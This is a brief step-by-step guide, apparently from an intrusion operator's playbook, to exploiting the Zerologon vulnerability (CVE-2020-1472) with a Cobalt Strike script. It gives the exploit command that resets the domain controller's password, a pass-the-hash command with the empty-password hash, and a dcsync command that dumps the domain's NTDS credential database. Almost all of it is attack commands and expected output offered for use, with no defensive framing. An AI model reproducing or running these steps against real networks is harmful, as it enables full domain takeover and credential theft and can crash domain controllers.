Exploiting CVE-2020-1472 Zerologon in Cobalt Strike

Download the script here
https://github.com/rsmudge/ZeroLogon-BOF

Include the script as usual, the address is
ZeroLogon-BOF/dist/zerologon.cna

The console should show a new command - zerologon

Application:

net domain - get domain name (e.g. domain.local)

Run the exploit:
zerologon iunderstand domain.local

iunderstand - stop word. By exploiting this vulnerability we reset the password. This exploit can lead to a failure of the domain controller. WE USE IT LAST.

In case of success we get:
Success! Use pth .\\\%S 31d6cfe0d16ae931b73c59d7e0c089c0 and run dcscync

Do exactly what it says.
pth .\\\%S 31d6cfe0d16ae931b73c59d7e0c089c0

And run
dcsync domain.local

If everything worked successfully, we get NTDS
